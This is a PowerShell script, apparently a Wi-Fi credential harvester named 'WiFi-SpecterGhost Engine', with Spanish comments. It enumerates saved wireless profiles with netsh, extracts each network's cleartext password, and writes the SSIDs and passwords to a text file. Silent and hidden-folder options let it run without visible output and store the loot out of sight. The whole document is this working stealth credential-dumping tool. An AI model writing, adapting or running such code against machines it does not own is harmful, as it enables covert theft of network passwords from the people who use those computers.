# --- WiFi-SpecterGhost Engine ---
# Este script es el corazon del proyecto. No lo borres, fiera.

param (
    [switch]$Silent = $false,
    [switch]$UseHiddenFolder = $false,
    [string]$OutputName = "wpsd.txt",
    [string]$FolderName = "invisible"
)

# Forzar codificacion UTF-8 para evitar deformaciones en tildes y caracteres especiales
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

$scriptDirectory = $PSScriptRoot
# --- Configuracion de rutas y nombres ---
$targetFolder = $scriptDirectory
if ($UseHiddenFolder) {
    $targetFolder = Join-Path -Path $scriptDirectory -ChildPath $FolderName
    try {
        if (-not (Test-Path -Path $targetFolder)) {
            New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
        }
        $folderItem = Get-Item -Path $targetFolder -Force
        if (($folderItem.Attributes -band [System.IO.FileAttributes]::Hidden) -ne [System.IO.FileAttributes]::Hidden) {
            $folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden
        }
    } catch { }
}

# Logica de incremento para no sobreescribir
$baseName = [System.IO.Path]::GetFileNameWithoutExtension($OutputName)
$extension = [System.IO.Path]::GetExtension($OutputName)
$finalOutputName = $OutputName
$counter = 1

while (Test-Path (Join-Path -Path $targetFolder -ChildPath $finalOutputName)) {
    $finalOutputName = "$baseName.$counter$extension"
    $counter++
}

$outputFilePath = Join-Path -Path $targetFolder -ChildPath $finalOutputName

if (-not $Silent) { Write-Host "Iniciando escaneo de redes guardadas..." -ForegroundColor Cyan }

# Obtener perfiles
$profilesOutput = (netsh wlan show profiles 2>$null)
$profileLines = $profilesOutput | Where-Object { $_ -match '^\s*(?:Perfil de todos los usuarios|All User Profile)\s*:\s*(.+)$' }

if (-not $profileLines) {
    if (-not $Silent) { Write-Host "No se encontraron perfiles guardados." -ForegroundColor Yellow }
} else {
    foreach ($line in $profileLines) {
        $profileName = ($line -split ':', 2)[1].Trim()
        $password = "[No encontrada]"

        try {
            $profileDetailOutput = (netsh wlan show profile name="$profileName" key=clear 2>$null)
            $keyLine = $profileDetailOutput | Where-Object { $_ -match '^\s*(?:Contenido de la clave|Key Content)\s*:\s*(.+)$' }

            if ($keyLine) {
                $password = ($keyLine -split ':', 2)[1].Trim()
            }
        } catch { continue }

        # Escribir al archivo
        try {
            "SSID: $profileName" | Add-Content -Path $outputFilePath -Encoding UTF8
            "PWD: $password" | Add-Content -Path $outputFilePath -Encoding UTF8
            "-----------------------------------------" | Add-Content -Path $outputFilePath -Encoding UTF8
            if (-not $Silent) { Write-Host "Procesado: $profileName" -ForegroundColor Green }
        } catch { }
    }
}


if (-not $Silent) { 
    Write-Host "Archivo generado: $finalOutputName" -ForegroundColor Cyan
    Write-Host "Ubicacion: $targetFolder" -ForegroundColor DarkCyan
}

if (-not $Silent) { Write-Host "Listo! El trabajo esta hecho." -ForegroundColor Cyan }
